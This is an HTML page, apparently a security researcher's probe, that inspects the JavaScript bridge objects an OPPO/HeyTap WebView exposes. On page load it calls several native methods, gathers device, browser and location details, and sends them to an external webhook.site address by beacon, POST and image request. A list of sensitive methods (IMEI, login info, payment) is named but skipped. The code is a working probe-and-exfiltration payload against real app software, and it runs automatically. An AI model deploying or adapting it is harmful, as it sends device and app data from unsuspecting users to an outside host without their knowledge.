<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO WebBridge Active Probe</title>
  <style>
    body { font-family: sans-serif; padding: 24px; }
    pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
    button { padding: 10px 16px; margin: 8px 0; }
  </style>
</head>
<body>
<h1>OPPO WebBridge Active Probe</h1>
<p id="status">WAITING</p>
<button onclick="runProbe('manual_button')">Run active probe again</button>
<pre id="out"></pre>

<script>
(function () {
  const WEBHOOK = "https://webhook.site/c9351bd1-51a3-45c3-a3d0-936fd40c67b3";

  const SAFE_METHODS = [
    "getPackageName",
    "getRomVersion",
    "getRomVersionCode",
    "getPhoneBrand",
    "getDeviceModel",
    "getNetworkType",
    "getStatusBarHeight",
    "isSupportShake"
  ];

  const DO_NOT_CALL = [
    "getImei",
    "getLoginInfo",
    "getOpenId",
    "startPay",
    "downloadGameByPackageName",
    "clipboardText",
    "openActivity",
    "openGame",
    "openGameDetailActivity",
    "openGameWithId",
    "openVideoPlayer",
    "openWebView",
    "callNativeApi",
    "callAsyncNativeApi",
    "doStartLogin",
    "cancelDownload",
    "pauseDownload",
    "startDuiBa",
    "statAction",
    "showScreenshotView"
  ];

  function safeString(x) {
    try {
      if (x === undefined) return "undefined";
      if (x === null) return "null";
      if (typeof x === "string") return x;
      if (typeof x === "number" || typeof x === "boolean") return String(x);
      return JSON.stringify(x);
    } catch (e) {
      try { return String(x); } catch (_) { return "[unstringifiable]"; }
    }
  }

  function describeObject(name, obj) {
    const r = {
      name,
      type: typeof obj,
      tag: null,
      ownKeys: [],
      functionKeys: [],
      valuePreview: null,
      error: null
    };

    try { r.tag = Object.prototype.toString.call(obj); } catch (e) { r.tag = "tag_error:" + e; }

    try {
      r.ownKeys = Object.getOwnPropertyNames(obj).slice(0, 120);
      r.functionKeys = r.ownKeys.filter(k => {
        try { return typeof obj[k] === "function"; } catch (e) { return false; }
      });
    } catch (e) {
      r.error = "keys_error:" + e;
    }

    try {
      if (typeof obj !== "object" && typeof obj !== "function") {
        r.valuePreview = String(obj);
      }
    } catch (e) {}

    return r;
  }

  function callSafeAndroidMethods() {
    const results = [];
    const a = window.android;

    if (!a || typeof a !== "object") {
      return [{ method: "__android_missing__", ok: false, error: "window.android is not object" }];
    }

    for (const m of SAFE_METHODS) {
      const item = { method: m, exists: false, ok: false, returnType: null, returnValue: null, error: null };
      try {
        item.exists = typeof a[m] === "function";
        if (!item.exists) {
          item.error = "missing_or_not_function";
        } else {
          const ret = a[m]();
          item.ok = true;
          item.returnType = typeof ret;
          item.returnValue = safeString(ret).slice(0, 500);
        }
      } catch (e) {
        item.error = String(e && (e.stack || e.message || e));
      }
      results.push(item);
    }

    for (const m of DO_NOT_CALL) {
      results.push({
        method: m,
        skipped: true,
        reason: "sensitive_or_state_changing_method_not_called"
      });
    }

    return results;
  }

  function callSafeNonAndroidMethods() {
    const results = [];

    try {
      if (window.HeytapTheme && typeof window.HeytapTheme.isNight === "function") {
        results.push({
          object: "HeytapTheme",
          method: "isNight",
          ok: true,
          returnValue: safeString(window.HeytapTheme.isNight()).slice(0, 500)
        });
      }
    } catch (e) {
      results.push({ object: "HeytapTheme", method: "isNight", ok: false, error: String(e) });
    }

    try {
      if (window.HeytapTheme && typeof window.HeytapTheme.getDarkConfiguration === "function") {
        results.push({
          object: "HeytapTheme",
          method: "getDarkConfiguration",
          ok: true,
          returnValue: safeString(window.HeytapTheme.getDarkConfiguration()).slice(0, 500)
        });
      }
    } catch (e) {
      results.push({ object: "HeytapTheme", method: "getDarkConfiguration", ok: false, error: String(e) });
    }

    try {
      if (window.__perfStatInWebview__ && typeof window.__perfStatInWebview__.getPerfData === "function") {
        results.push({
          object: "__perfStatInWebview__",
          method: "getPerfData",
          ok: true,
          returnValue: safeString(window.__perfStatInWebview__.getPerfData()).slice(0, 1000)
        });
      }
    } catch (e) {
      results.push({ object: "__perfStatInWebview__", method: "getPerfData", ok: false, error: String(e) });
    }

    return results;
  }

  function collectPassive() {
    const names = [
      "android",
      "HeytapTheme",
      "__perfStatInWebview__",
      "__perfStatInWebview_isReady__",
      "JSBridge",
      "jsBridge",
      "OPPO",
      "Oppo",
      "oppo",
      "HeyTap",
      "heytap",
      "GameSpace",
      "Oaps",
      "oaps",
      "Native",
      "native",
      "WebViewJavascriptBridge",
      "JavascriptInterface"
    ];

    const suspectedObjects = [];
    for (const n of names) {
      try {
        if (typeof window[n] !== "undefined") {
          suspectedObjects.push(describeObject(n, window[n]));
        }
      } catch (e) {
        suspectedObjects.push({ name: n, error: String(e) });
      }
    }

    return suspectedObjects;
  }

  function sendBeacon(payload) {
    const json = JSON.stringify(payload);
    const encoded = encodeURIComponent(json);

    try {
      navigator.sendBeacon(WEBHOOK + "/active-bridge-probe-beacon", new Blob([json], { type: "application/json" }));
    } catch (e) {}

    try {
      fetch(WEBHOOK + "/active-bridge-probe-post", {
        method: "POST",
        mode: "no-cors",
        headers: { "content-type": "application/json" },
        body: json
      }).catch(function(){});
    } catch (e) {}

    try {
      new Image().src = WEBHOOK + "/active-bridge-probe-get?event=ACTIVE_BRIDGE_PROBE_RESULT&t=" + Date.now() + "&d=" + encoded.slice(0, 7000);
    } catch (e) {}
  }

  window.runProbe = function(reason) {
    const result = {
      eventType: "ACTIVE_BRIDGE_PROBE_RESULT",
      version: "active_probe_v1_safe_methods_only",
      ts: new Date().toISOString(),
      reason,
      location: {
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        referrer: document.referrer || null
      },
      environment: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        webdriver: navigator.webdriver,
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight
        },
        viewport: {
          innerWidth: innerWidth,
          innerHeight: innerHeight
        }
      },
      passiveObjects: collectPassive(),
      androidSafeMethodResults: callSafeAndroidMethods(),
      nonAndroidSafeMethodResults: callSafeNonAndroidMethods()
    };

    document.getElementById("status").textContent = "ACTIVE_PROBE_DONE: " + result.ts;
    document.getElementById("out").textContent = JSON.stringify(result, null, 2);

    sendBeacon(result);
  };

  setTimeout(function () {
    runProbe("auto_after_load_1200ms");
  }, 1200);
})();
</script>
</body>
</html>
